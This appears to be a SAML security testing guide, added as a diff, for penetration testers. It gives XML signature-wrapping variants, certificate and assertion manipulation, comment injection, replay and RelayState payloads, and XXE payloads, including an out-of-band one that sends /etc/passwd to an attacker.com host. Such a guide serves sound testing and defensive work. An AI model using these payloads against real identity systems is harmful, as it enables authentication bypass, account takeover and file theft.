@@ -1,0 +1,520 @@
+<saml_security_guide>
+<title>SAML SECURITY TESTING</title>
+
+<critical>SAML (Security Assertion Markup Language) is widely used for enterprise Single Sign-On. Its XML-based nature and complex signature verification create numerous attack surfaces. Flaws in SAML implementations can lead to authentication bypass, account takeover, and privilege escalation.</critical>
+
+<scope>
+- SAML Response and Assertion manipulation
+- XML Signature wrapping attacks
+- XXE in SAML processing
+- Certificate validation flaws
+- Replay attacks
+- Comment injection
+- SAML Redirect and POST binding attacks
+</scope>
+
+<methodology>
+1. Intercept and decode SAML responses to understand structure.
+2. Test XML signature validation for wrapping and bypass vulnerabilities.
+3. Probe for XXE injection in SAML processing.
+4. Test assertion manipulation for authentication bypass.
+5. Check certificate validation and trust chain issues.
+</methodology>
+
+<saml_basics>
+<flow_understanding>
+{% raw %}
+# SAML SSO Flow:
+# 1. User accesses Service Provider (SP)
+# 2. SP redirects to Identity Provider (IdP) with AuthnRequest
+# 3. User authenticates at IdP
+# 4. IdP sends SAML Response to SP (via user's browser)
+# 5. SP validates response and creates session
+
+# Key endpoints:
+# - SP: /saml/acs (Assertion Consumer Service)
+# - SP: /saml/slo (Single Logout)
+# - SP: /saml/metadata
+# - IdP: /saml/sso
+# - IdP: /saml/metadata
+
+# Bindings:
+# - HTTP-Redirect: Base64 + DEFLATE encoded in URL
+# - HTTP-POST: Base64 encoded in form field
+{% endraw %}
+</flow_understanding>
+
+<response_structure>
+{% raw %}
+<!-- Typical SAML Response structure -->
+<samlp:Response ID="_response123" IssueInstant="2024-01-01T00:00:00Z">
+  <saml:Issuer>https://idp.example.com</saml:Issuer>
+  <ds:Signature><!-- Signature over Response --></ds:Signature>
+  <samlp:Status>
+    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
+  </samlp:Status>
+  <saml:Assertion ID="_assertion456">
+    <saml:Issuer>https://idp.example.com</saml:Issuer>
+    <ds:Signature><!-- Signature over Assertion --></ds:Signature>
+    <saml:Subject>
+      <saml:NameID>user@example.com</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData
+          NotOnOrAfter="2024-01-01T00:05:00Z"
+          Recipient="https://sp.example.com/saml/acs"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="..." NotOnOrAfter="...">
+      <saml:AudienceRestriction>
+        <saml:Audience>https://sp.example.com</saml:Audience>
+      </saml:AudienceRestriction>
+    </saml:Conditions>
+    <saml:AuthnStatement AuthnInstant="...">
+      <saml:AuthnContext>
+        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
+      </saml:AuthnContext>
+    </saml:AuthnStatement>
+    <saml:AttributeStatement>
+      <saml:Attribute Name="email">
+        <saml:AttributeValue>user@example.com</saml:AttributeValue>
+      </saml:Attribute>
+      <saml:Attribute Name="role">
+        <saml:AttributeValue>user</saml:AttributeValue>
+      </saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>
+{% endraw %}
+</response_structure>
+</saml_basics>
+
+<signature_attacks>
+<signature_wrapping>
+{% raw %}
+<!-- Signature Wrapping Attack (XSW) -->
+<!-- Move signed assertion, add malicious one -->
+
+<!-- Original (signature references #_assertion456) -->
+<samlp:Response>
+  <saml:Assertion ID="_assertion456">
+    <!-- Legitimate signed assertion -->
+  </saml:Assertion>
+</samlp:Response>
+
+<!-- XSW Attack Variant 1: Add malicious assertion before signed one -->
+<samlp:Response>
+  <saml:Assertion ID="_malicious">
+    <saml:Subject>
+      <saml:NameID>admin@example.com</saml:NameID>
+    </saml:Subject>
+    <!-- Malicious claims -->
+  </saml:Assertion>
+  <saml:Assertion ID="_assertion456">
+    <!-- Original signed assertion (signature still valid) -->
+  </saml:Assertion>
+</samlp:Response>
+
+<!-- XSW Variant 2: Wrap signed assertion in Extensions -->
+<samlp:Response>
+  <saml:Assertion ID="_malicious">
+    <!-- Malicious assertion -->
+  </saml:Assertion>
+  <samlp:Extensions>
+    <saml:Assertion ID="_assertion456">
+      <!-- Original signed assertion moved here -->
+    </saml:Assertion>
+  </samlp:Extensions>
+</samlp:Response>
+
+<!-- XSW Variant 3: Nested response -->
+<samlp:Response ID="_response123">
+  <saml:Assertion ID="_malicious">
+    <!-- Malicious assertion -->
+    <samlp:Response ID="_nested">
+      <saml:Assertion ID="_assertion456">
+        <!-- Original signed assertion -->
+      </saml:Assertion>
+    </samlp:Response>
+  </saml:Assertion>
+</samlp:Response>
+{% endraw %}
+</signature_wrapping>
+
+<signature_exclusion>
+{% raw %}
+# Test if signature is required
+
+# Remove signature entirely
+# Remove <ds:Signature> element from response/assertion
+
+# If SP accepts unsigned assertions:
+# - Authentication bypass possible
+# - Create arbitrary assertions
+
+# Test with signature on Response but not Assertion
+# Test with signature on Assertion but not Response
+{% endraw %}
+</signature_exclusion>
+
+<signature_validation_bypass>
+{% raw %}
+# Certificate validation issues
+
+# 1. Self-signed certificate
+# Replace IdP certificate with self-signed
+# Sign response with attacker's private key
+
+# 2. Certificate not validated
+# Use any certificate that SP doesn't verify
+
+# 3. KeyInfo manipulation
+# Inject certificate in KeyInfo
+<ds:KeyInfo>
+  <ds:X509Data>
+    <ds:X509Certificate>ATTACKER_CERT_BASE64</ds:X509Certificate>
+  </ds:X509Data>
+</ds:KeyInfo>
+
+# 4. Reference URI manipulation
+# Change what the signature covers
+<ds:Reference URI="#_wrong_id">
+{% endraw %}
+</signature_validation_bypass>
+</signature_attacks>
+
+<xxe_attacks>
+<xxe_in_saml>
+{% raw %}
+# XXE in SAML Response/Request processing
+
+# Basic XXE
+<?xml version="1.0"?>
+<!DOCTYPE samlp:Response [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<samlp:Response>
+  <saml:Assertion>
+    <saml:AttributeStatement>
+      <saml:Attribute Name="xxe">
+        <saml:AttributeValue>&xxe;</saml:AttributeValue>
+      </saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>
+
+# OOB XXE (Out-of-Band)
+<!DOCTYPE samlp:Response [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+  %xxe;
+]>
+
+# External DTD (xxe.dtd):
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfil;
+
+# Parameter entity injection
+<!DOCTYPE samlp:Response [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+{% endraw %}
+</xxe_in_saml>
+
+<xxe_locations>
+{% raw %}
+# Test XXE in multiple locations:
+
+# 1. SAML Response body
+# 2. SAML Request (AuthnRequest)
+# 3. Logout Request
+# 4. Artifact Resolution
+# 5. Metadata endpoints
+
+# Base64 decode, inject XXE, re-encode
+# For POST binding: SAMLResponse form field
+# For Redirect binding: SAMLRequest/SAMLResponse URL param (also DEFLATE)
+{% endraw %}
+</xxe_locations>
+</xxe_attacks>
+
+<assertion_manipulation>
+<subject_manipulation>
+{% raw %}
+# Modify NameID to impersonate another user
+
+<!-- Original -->
+<saml:NameID>user@example.com</saml:NameID>
+
+<!-- Modified -->
+<saml:NameID>admin@example.com</saml:NameID>
+<saml:NameID>root@example.com</saml:NameID>
+<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">victim@example.com</saml:NameID>
+
+# Test different NameID formats
+# - urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress
+# - urn:oasis:names:tc:SAML:2.0:nameid-format:persistent
+# - urn:oasis:names:tc:SAML:2.0:nameid-format:transient
+{% endraw %}
+</subject_manipulation>
+
+<attribute_manipulation>
+{% raw %}
+# Modify or add attributes
+
+<!-- Add admin role -->
+<saml:Attribute Name="role">
+  <saml:AttributeValue>admin</saml:AttributeValue>
+</saml:Attribute>
+
+<!-- Add group membership -->
+<saml:Attribute Name="memberOf">
+  <saml:AttributeValue>cn=admins,ou=groups,dc=example,dc=com</saml:AttributeValue>
+</saml:Attribute>
+
+<!-- Modify email for account takeover -->
+<saml:Attribute Name="email">
+  <saml:AttributeValue>attacker@evil.com</saml:AttributeValue>
+</saml:Attribute>
+
+<!-- Add custom attributes -->
+<saml:Attribute Name="isAdmin">
+  <saml:AttributeValue>true</saml:AttributeValue>
+</saml:Attribute>
+{% endraw %}
+</attribute_manipulation>
+
+<conditions_bypass>
+{% raw %}
+# Bypass time-based conditions
+
+<!-- Extend validity -->
+<saml:Conditions 
+  NotBefore="2020-01-01T00:00:00Z" 
+  NotOnOrAfter="2030-12-31T23:59:59Z">
+
+<!-- Remove conditions entirely -->
+<!-- Some SPs may not enforce -->
+
+<!-- Modify audience -->
+<saml:AudienceRestriction>
+  <saml:Audience>https://different-sp.example.com</saml:Audience>
+</saml:AudienceRestriction>
+{% endraw %}
+</conditions_bypass>
+</assertion_manipulation>
+
+<comment_injection>
+<nameId_truncation>
+{% raw %}
+# Comment injection to truncate NameID
+
+<!-- Original verification might see: admin@example.com -->
+<!-- But application processes: admin -->
+
+<saml:NameID>admin<!-- comment -->@example.com</saml:NameID>
+
+# Or
+<saml:NameID>admin<!---->@example.com</saml:NameID>
+
+# Various comment positions:
+<saml:NameID>admin@example.com<!--.attacker.com--></saml:NameID>
+<saml:NameID><!--victim-->attacker@example.com</saml:NameID>
+{% endraw %}
+</nameId_truncation>
+
+<attribute_truncation>
+{% raw %}
+# Comment injection in attributes
+
+<saml:AttributeValue>admin<!-- ignored --></saml:AttributeValue>
+<saml:AttributeValue><!--prefix-->value</saml:AttributeValue>
+{% endraw %}
+</attribute_truncation>
+</comment_injection>
+
+<replay_attacks>
+<response_replay>
+{% raw %}
+# Replay a captured SAML Response
+
+# 1. Capture valid SAML Response
+# 2. Extract SAMLResponse parameter
+# 3. Submit to ACS endpoint again
+
+curl -X POST https://sp.example.com/saml/acs \
+  -d "SAMLResponse=CAPTURED_BASE64_RESPONSE" \
+  -d "RelayState=ORIGINAL_RELAY_STATE"
+
+# Effective if:
+# - InResponseTo not validated
+# - NotOnOrAfter not enforced
+# - Response ID not tracked for replay prevention
+{% endraw %}
+</response_replay>
+
+<relay_state_manipulation>
+{% raw %}
+# Manipulate RelayState for redirect attacks
+
+# Original
+RelayState=/dashboard
+
+# Modified for open redirect
+RelayState=https://attacker.com
+
+# XSS via RelayState (if reflected without encoding)
+RelayState=javascript:alert(1)
+RelayState=<script>alert(1)</script>
+
+# Path traversal
+RelayState=/admin
+RelayState=/../../admin
+{% endraw %}
+</relay_state_manipulation>
+</replay_attacks>
+
+<idp_initiated_attacks>
+<unsolicited_response>
+{% raw %}
+# IdP-initiated SSO vulnerabilities
+
+# Send SAML Response without prior AuthnRequest
+# If SP accepts unsolicited responses:
+
+# 1. Craft malicious SAML Response
+# 2. Send directly to SP's ACS
+# 3. If signature not required or can be bypassed, gain access
+
+# Test with InResponseTo:
+# - Missing InResponseTo
+# - Invalid InResponseTo
+# - InResponseTo referencing non-existent request
+{% endraw %}
+</unsolicited_response>
+
+<destination_bypass>
+{% raw %}
+# Destination validation bypass
+
+<!-- Response intended for different SP -->
+<samlp:Response 
+  Destination="https://different-sp.example.com/saml/acs">
+
+<!-- No destination specified -->
+<samlp:Response>  <!-- Missing Destination -->
+
+<!-- Destination with variations -->
+<samlp:Response 
+  Destination="https://sp.example.com/saml/acs/../admin">
+{% endraw %}
+</destination_bypass>
+</idp_initiated_attacks>
+
+<binding_attacks>
+<redirect_binding>
+{% raw %}
+# HTTP-Redirect binding attacks
+
+# SAMLRequest/SAMLResponse is:
+# 1. Compressed (DEFLATE)
+# 2. Base64 encoded
+# 3. URL encoded
+# 4. In query parameter
+
+# Signature in query parameter (if signed)
+?SAMLRequest=...&SigAlg=...&Signature=...
+
+# Test signature removal
+# Remove Signature parameter from URL
+
+# Signature algorithm manipulation
+SigAlg=http://www.w3.org/2000/09/xmldsig#rsa-sha1
+SigAlg=http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
+{% endraw %}
+</redirect_binding>
+
+<post_binding>
+{% raw %}
+# HTTP-POST binding
+
+# SAMLResponse in form field (Base64 only, no DEFLATE)
+<form action="https://sp.example.com/saml/acs" method="POST">
+  <input name="SAMLResponse" value="BASE64_RESPONSE"/>
+  <input name="RelayState" value="/dashboard"/>
+</form>
+
+# Submit modified responses via POST
+# Easier to manipulate than redirect binding
+{% endraw %}
+</post_binding>
+</binding_attacks>
+
+<testing_tools>
+{% raw %}
+# SAML Raider (Burp Extension)
+# - Intercept and modify SAML messages
+# - Signature manipulation
+# - XXE testing
+
+# saml-tool
+# - Decode/encode SAML messages
+# - Sign with custom certificates
+
+# Python libraries
+from lxml import etree
+from signxml import XMLSigner, XMLVerifier
+
+# Decode SAML Response
+import base64
+import zlib
+decoded = base64.b64decode(saml_response)
+# For redirect binding: zlib.decompress(decoded, -15)
+
+# Online tools (for testing only, not production data)
+# - samltool.io
+# - samltools.com
+{% endraw %}
+</testing_tools>
+
+<validation>
+1. Demonstrate authentication bypass via signature wrapping.
+2. Show XXE leading to file disclosure or SSRF.
+3. Prove assertion manipulation enabling impersonation.
+4. Document replay attack success with captured response.
+5. Provide step-by-step reproduction with modified XML.
+</validation>
+
+<false_positives>
+- Proper signature validation with reference verification
+- XXE disabled in XML parser
+- Strict InResponseTo validation
+- Response ID tracking for replay prevention
+- Certificate pinning and validation
+</false_positives>
+
+<impact>
+- Complete authentication bypass
+- Account takeover via impersonation
+- Privilege escalation through attribute manipulation
+- Data exposure via XXE
+- Session hijacking through replay attacks
+- Cross-tenant access in multi-tenant systems
+</impact>
+
+<pro_tips>
+1. Use SAML Raider for systematic signature bypass testing.
+2. Test all XSW variants; some bypass specific implementations.
+3. Check if both Response and Assertion signatures are required.
+4. Test XXE in every SAML-accepting endpoint.
+5. Capture and replay responses to test replay prevention.
+6. Check certificate validation by signing with self-signed cert.
+7. Test comment injection in NameID and attributes.
+8. Examine how SP processes multiple assertions in one response.
+9. Test unsolicited (IdP-initiated) response acceptance.
+10. Look for different behavior between POST and Redirect bindings.
+</pro_tips>
+
+<remember>SAML security hinges on proper XML signature verification and XML parser configuration. The complexity of SAML makes it easy for implementers to miss edge cases. Always test signature wrapping comprehensively, and remember that valid signatures on wrong data provide no security.</remember>
+</saml_security_guide>
